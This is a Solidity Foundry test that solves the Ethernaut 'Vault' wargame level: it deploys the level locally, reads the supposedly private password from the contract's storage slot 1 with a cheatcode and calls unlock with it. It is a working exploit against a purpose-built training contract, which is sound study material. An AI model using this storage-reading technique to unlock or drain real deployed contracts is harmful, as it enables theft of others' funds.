// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";

import "../levels/08-Vault/VaultFactory.sol";
import "../core/Ethernaut.sol";

contract VaultTest is DSTest {
    //--------------------------------------------------------------------------------
    //                            Setup Game Instance
    //--------------------------------------------------------------------------------

    Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
    Ethernaut ethernaut;
    address attacker = address(0xdeadbeef);

    function setUp() public {
        ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
        vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
    }

    function testVaultHack() public {
        //--------------------------------------------------------------------------------
        //                             Setup Level Instance
        //--------------------------------------------------------------------------------
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault vaultContract = Vault(payable(levelAddress));

        //--------------------------------------------------------------------------------
        //                             Start Level Attack
        //--------------------------------------------------------------------------------
        // Loads a storage slot from an address (who, slot)
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        // Log bytes stored at that memory location
        emit log_bytes(abi.encodePacked(password));
        // Call the unlock function with the password read from storage
        vaultContract.unlock(password);

        //--------------------------------------------------------------------------------
        //                                Submit Level
        //--------------------------------------------------------------------------------
        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(challengeCompleted);
    }
}
